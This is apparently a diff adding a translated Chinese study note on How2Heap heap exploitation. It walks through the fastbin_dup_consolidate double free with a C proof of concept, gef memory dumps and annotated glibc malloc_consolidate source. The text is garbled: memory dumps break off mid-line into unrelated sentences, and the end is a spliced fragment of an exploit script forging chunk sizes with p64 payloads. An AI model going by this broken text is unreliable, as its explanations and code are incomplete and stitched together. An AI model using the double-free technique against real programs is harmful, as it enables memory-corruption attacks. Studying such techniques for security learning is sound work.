@@ -1,0 +1,153 @@
+# How2Heap堆利用学习笔记（二）
+|
+##### 译文声明
+本文是翻译文章
+译文仅供参考，具体内容表达以及含义原文为准。
+概述：上一篇，我们介绍了一种Double free技术。并且实现了对malloc_hook的fastbin_attack。
+这次将介绍如何利用malloc中的consolidate机制来实现double free。本文会涉及一些源代码，如有解释错误，恳请各位大神指正。
+## 0x01 利用consolidate的Double Free
+###  1.1 fastbin_dup_consolidate分析
+首先分析一下案例代码
+    #include 
+    #include 
+    #include 
+    int main() {
+      void* p1 = malloc(0x40);
+      void* p2 = malloc(0x40);
+      fprintf(stderr, "Allocated two fastbins: p1=%p p2=%pn", p1, p2);
+      fprintf(stderr, "Now free p1!n");
+      free(p1);
+      void* p3 = malloc(0x400);
+      fprintf(stderr, "Allocated large bin to trigger malloc_consolidate(): p3=%pn", p3);
+      fprintf(stderr, "In malloc_consolidate(), p1 is moved to the unsorted bin.n");
+      free(p1);
+      fprintf(stderr, "Trigger the double free vulnerability!n");
+      fprintf(stderr, "We can pass the check in malloc() since p1 is not fast top.n");
+      fprintf(stderr, "Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %pn", malloc(0x40), malloc(0x40));
+    }
+编译程序时时加-g参数，动态调试中可以同步源码进行分析。
+###  1.2流程分析
+程序首先malloc分配了两个0x40的内存p1和p2,然后free掉chunk_p1,小于64的chunkp1会被链入fastbins中。
+    gef➤  x/40gx 0x602010-0x10
+    0x602000:    0x0000000000000000    0x0000000000000051 
+    0x602010:    0x0000000000000000    0x0000000000000000 1024字节)时，首先操作是判断fast
+bins是否包含chunk。如果包含，则使用malloc_consolidate函数将fastbin中的chunk合并，并放入unsortbins。根据大小放入small
+bins/large bins。
+让我通过glibc源码进行阅读分析
+，FTP[下载地址](https://ftp.gnu.org/gnu/glibc/),malloc的实现在/malloc/malloc.c
+malloc.c在1055行分别定义了malloc free realloc函数
+    static void*  _int_malloc(mstate, size_t);
+    static void     _int_free(mstate, mchunkptr, int);
+    static void*  _int_realloc(mstate, mchunkptr, INTERNAL_SIZE_T,
+    ​               INTERNAL_SIZE_T);
+在_int_malloc的Define下找到触发consolidate的代码部分。
+首先通过have_fastchunks判断fastbins是否链有空闲堆。
+have_fastchunks的宏定义即为判断fastbin中是否包含chunk，flag为0的时候说明存在chunk。
+    #define have_fastchunks(M)     (((M)->flags & FASTCHUNKS_BIT) == 0)
+如果包含chunk，将会调用consolidate来合并fastbins中的chunk，并将这些空闲的chunk加入unsorted bin中。
+本案例触发consolidate的源码
+      /*
+    ​     If this is a large request, consolidate fastbins before continuing.
+    ​     While it might look excessive to kill all fastbins before
+    ​     even seeing if there is space available, this avoids
+    ​     fragmentation problems normally associated with fastbins.
+    ​     Also, in practice, programs tend to have runs of either small or
+    ​     large requests, but less often mixtures, so consolidation is not
+    ​     invoked all that often in most programs. And the programs that
+    ​     it is called frequently in otherwise tend to fragment.
+       */
+      else
+    ​    {
+    ​      idx = largebin_index (nb);
+    ​      if (have_fastchunks (av))
+    ​        malloc_consolidate (av);
+    }
+malloc_consolidate部分的源码
+    static void malloc_consolidate(mstate av)
+    {
+      /*
+        If max_fast is 0, we know that av hasn't
+        yet been initialized, in which case do so below
+      */
+    //判断fastbins是否存在chunks
+      if (get_max_fast () != 0) {
+        clear_fastchunks(av); //将fastchunk的flag标志设置为0
+        unsorted_bin = unsorted_chunks(av); //获取unsorted_bin指针
+        /*
+          Remove each chunk from fast bin and consolidate it, placing it
+          then in unsorted bin. Among other reasons for doing this,
+          placing in unsorted bin avoids needing to calculate actual bins
+          until malloc is sure that chunks aren't immediately going to be
+          reused anyway.
+        */
+        maxfb = &fastbin (av, NFASTBINS - 1); //获取fastbin链的末尾作为限位器
+        fb = &fastbin (av, 0); //当前fastbin链的地址
+        do {
+          p = atomic_exchange_acq (fb, 0);//不太懂这一句，希望有大佬能解答
+    //遍历fastbins，直到遍历结束
+          if (p != 0) {
+        do {
+          check_inuse_chunk(av, p);
+          nextp = p->fd; 
+          /* Slightly streamlined version of consolidation code in free() */
+          size = p->size & ~(PREV_INUSE|NON_MAIN_ARENA);
+          nextchunk = chunk_at_offset(p, size);
+          nextsize = chunksize(nextchunk);
+          if (!prev_inuse(p)) {
+            prevsize = p->prev_size;
+            size += prevsize;
+            p = chunk_at_offset(p, -((long) prevsize));
+            unlink(av, p, bck, fwd);
+          }
+          if (nextchunk != av->top) {
+            nextinuse = inuse_bit_at_offset(nextchunk, nextsize);
+            if (!nextinuse) {
+              size += nextsize;
+              unlink(av, nextchunk, bck, fwd);
+            } else
+              clear_inuse_bit_at_offset(nextchunk, 0);
+    //将fastbin合并的chunk添加到链接到unsorted_bin的链中
+            first_unsorted = unsorted_bin->fd;
+            unsorted_bin->fd = p;
+            first_unsorted->bk = p;
+            if (!in_smallbin_range (size)) {
+              p->fd_nextsize = NULL;
+              p->bk_nextsize = NULL;
+            }
+            set_head(p, size | PREV_INUSE);
+            p->bk = unsorted_bin;
+            p->fd = first_unsorted;
+            set_foot(p, size);
+          }
+          else {
+            size += nextsize;
+            set_head(p, size | PREV_INUSE);
+            av->top = p;
+          }
+        } while ( (p = nextp) != 0);
+          }
+        } while (fb++ != maxfb);
+      }
+    //如果fastbin为空
+      else {
+        malloc_init_state(av);
+        check_malloc_state(av);
+      }
+    }
+想了解Glibc具体如何实现的，非常安利华庭大佬写的《glibc内存管理》，讲解的非常详细，看完一定会有收获。
+继续我们的程序分析，目前我们已经将chunk_p1放入了small_bins中。
+此时free(p1)并不会触发double free检测。看下面的图，就能很容易能明白原因。
+P1默认会被释放到fast bins，而同时之前的P1也被释放在smallbins中，程序并没有对此做出检测。
+最后两次malloc(0x40)第一次从fastbins中获取了chunk_p1的地址，第二次从small_bins中获取了相同的地址。完成了一次double
+free。
+    0x6020a0:    0x0000000000000000    0x0000000000000411
+    gef➤  x/20  0x602010-0x10
+    0x602000:    0x0000000000000000    0x0000000000000051
+    0x602010:    0x0000000000000000    0x00007ffff7dd1bb8 size
+    ​    Fill(0,payload)
+    ​    Alloc(0x80) #index 2
+    ​    Alloc(0x10) #index 3 ,to avoid chunk_2 merge into top_chunk
+    ​    #Bk_NextSize=0x71, to avoid "free(): invalid next size (fast)"
+    ​    payload=p64(0)*3
+    ​    payload+=p64(0x71) #Chunk2->BK_nextsize
+    ​    Fill(2,payload)
